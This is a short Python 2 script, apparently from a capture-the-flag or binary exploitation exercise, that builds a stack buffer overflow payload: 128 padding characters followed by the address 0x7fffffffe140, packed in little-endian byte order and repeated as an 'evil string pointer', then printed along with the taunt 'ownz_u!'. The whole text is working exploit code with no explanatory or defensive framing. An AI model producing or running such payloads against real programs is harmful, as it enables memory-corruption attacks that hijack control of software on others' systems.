# 0x7fffffffe140 hexa to binary for each byte, then convert to character
bytes = [0b00000000, 0b00000000, 0b01111111, 0b11111111, 0b11111111, 0b11111111, 0b11100001, 0b01000000]
bytes.reverse()
i = 0
while i < len(bytes):
    bytes[i] = chr(bytes[i])
    i += 1
# repeat byte sequence for evil string pointer
bytes *= 2
# 128 bytes for string length
overflow_str = ('a'*128 + ''.join(bytes))
print overflow_str
print 'ownz_u!'
